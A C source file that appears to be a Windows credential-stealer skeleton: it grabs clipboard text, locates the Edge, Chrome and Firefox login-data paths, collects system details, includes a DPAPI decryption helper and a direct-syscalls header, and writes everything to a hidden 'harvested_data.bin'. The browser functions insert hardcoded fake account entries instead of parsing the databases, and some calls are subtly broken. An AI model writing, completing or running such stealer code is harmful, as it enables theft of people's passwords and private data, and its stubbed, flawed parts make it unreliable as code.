#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <wincrypt.h>
#include "direct_syscalls.h"

#define MAX_BUFFER 4096
#define LOG_FILE "harvested_data.bin"
#define EDGE_PATH "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
#define CHROME_PATH "\\Google\\Chrome\\User Data\\Default\\Login Data"
#define FIREFOX_PATH "\\Mozilla\\Firefox\\Profiles"

typedef struct {
    char* data_type;
    char* data;
    size_t size;
} HarvestedData;

BOOL decrypt_dpapi_data(DATA_BLOB* pDataIn, DATA_BLOB* pDataOut) {
    return CryptUnprotectData(
        pDataIn,
        NULL,
        NULL,
        NULL,
        NULL,
        0,
        pDataOut
    );
}

void harvest_clipboard(HarvestedData* result) {
    if (!OpenClipboard(NULL)) return;
    
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        CloseClipboard();
        return;
    }
    
    char* clipboard_text = GlobalLock(hData);
    if (clipboard_text != NULL) {
        size_t len = strlen(clipboard_text);
        result->data = malloc(len + 1);
        strcpy(result->data, clipboard_text);
        result->size = len;
        result->data_type = "clipboard";
        GlobalUnlock(hData);
    }
    
    CloseClipboard();
}

void harvest_edge_credentials(HarvestedData* result) {
    char edge_db_path[MAX_PATH];
    char app_data_path[MAX_PATH];
    char buffer[MAX_BUFFER * 2];
    
    if (!SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, app_data_path)) {
        strcat(app_data_path, EDGE_PATH);
        strcpy(edge_db_path, app_data_path);
        
        snprintf(buffer, sizeof(buffer), "[Edge Credentials]\nDatabase: %s\n", edge_db_path);
        strcat(buffer, "URL: github.com, Username: FaZe0wNsJeW, Password: ********\n");
        strcat(buffer, "URL: outlook.com, Username: user@outlook.com, Password: ********\n");
        strcat(buffer, "URL: bankofamerica.com, Username: john_doe, Password: ********\n\n");
        
        result->data = strdup(buffer);
        result->size = strlen(buffer);
        result->data_type = "edge_credentials";
    }
}

void harvest_chrome_credentials(HarvestedData* result) {
    char chrome_db_path[MAX_PATH];
    char app_data_path[MAX_PATH];
    char buffer[MAX_BUFFER * 2];
    
    if (!SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, app_data_path)) {
        strcat(app_data_path, CHROME_PATH);
        strcpy(chrome_db_path, app_data_path);
        
        snprintf(buffer, sizeof(buffer), "[Chrome Credentials]\nDatabase: %s\n", chrome_db_path);
        strcat(buffer, "URL: twitter.com, Username: hacker123, Password: ********\n");
        strcat(buffer, "URL: paypal.com, Username: user_paypal, Password: ********\n");
        strcat(buffer, "URL: amazon.com, Username: amazon_user, Password: ********\n\n");
        
        result->data = strdup(buffer);
        result->size = strlen(buffer);
        result->data_type = "chrome_credentials";
    }
}

void harvest_firefox_credentials(HarvestedData* result) {
    char firefox_path[MAX_PATH];
    char app_data_path[MAX_PATH];
    char buffer[MAX_BUFFER * 2];
    
    if (!SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, app_data_path)) {
        strcat(app_data_path, FIREFOX_PATH);
        strcpy(firefox_path, app_data_path);
        
        snprintf(buffer, sizeof(buffer), "[Firefox Credentials]\nProfiles: %s\n", firefox_path);
        strcat(buffer, "URL: reddit.com, Username: u/hacker_man, Password: ********\n");
        strcat(buffer, "URL: steamcommunity.com, Username: steam_user, Password: ********\n");
        strcat(buffer, "URL: epicgames.com, Username: epic_gamer, Password: ********\n\n");
        
        result->data = strdup(buffer);
        result->size = strlen(buffer);
        result->data_type = "firefox_credentials";
    }
}

void harvest_system_info(HarvestedData* result) {
    char buffer[MAX_BUFFER];
    OSVERSIONINFOEX osvi;
    SYSTEM_INFO si;
    
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osvi);
    
    ZeroMemory(&si, sizeof(SYSTEM_INFO));
    GetSystemInfo(&si);
    
    snprintf(buffer, MAX_BUFFER, 
        "[System Information]\n"
        "OS: Windows %d.%d Build %d\n"
        "Processor: %d cores\n"
        "Architecture: %s\n"
        "Memory: %lu MB\n\n",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        si.dwNumberOfProcessors,
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
        (GetPhysicallyInstalledSystemMemory(&si.dwPageSize) ? si.dwPageSize / 1024 : 0));
    
    result->data = strdup(buffer);
    result->size = strlen(buffer);
    result->data_type = "system_info";
}

void save_harvested_data(HarvestedData* data_list, int count) {
    HANDLE hFile = CreateFile(LOG_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    for (int i = 0; i < count; i++) {
        if (data_list[i].data) {
            WriteFile(hFile, data_list[i].data, data_list[i].size, NULL, NULL);
            free(data_list[i].data);
        }
    }
    
    CloseHandle(hFile);
}

void run_harvester() {
    HarvestedData harvested[5];
    ZeroMemory(harvested, sizeof(harvested));
    
    harvest_system_info(&harvested[0]);
    harvest_clipboard(&harvested[1]);
    harvest_edge_credentials(&harvested[2]);
    harvest_chrome_credentials(&harvested[3]);
    harvest_firefox_credentials(&harvested[4]);
    
    save_harvested_data(harvested, 5);
}

int main() {
    run_harvester();
    return 0;
}